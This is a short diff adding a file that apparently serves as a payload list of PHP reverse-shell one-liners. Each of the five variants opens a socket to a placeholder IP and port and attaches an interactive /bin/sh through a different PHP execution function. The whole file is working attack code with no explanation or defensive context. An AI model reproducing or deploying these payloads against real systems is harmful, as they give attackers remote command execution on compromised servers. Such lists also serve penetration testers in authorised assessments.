@@ -1,0 +1,9 @@
+$s=fsockopen("<IP>",<PORT>);exec("/bin/sh -i <&3 >&3 2>&3");
+ 
+$s=fsockopen("<IP>",<PORT>);shell_exec("/bin/sh -i <&3 >&3 2>&3");
+ 
+$s=fsockopen("<IP>",<PORT>);`/bin/sh -i <&3 >&3 2>&3`;
+ 
+$s=fsockopen("<IP>",<PORT>);system("/bin/sh -i <&3 >&3 2>&3");
+ 
+$s=fsockopen("<IP>",<PORT>);popen("/bin/sh -i <&3 >&3 2>&3", "r");
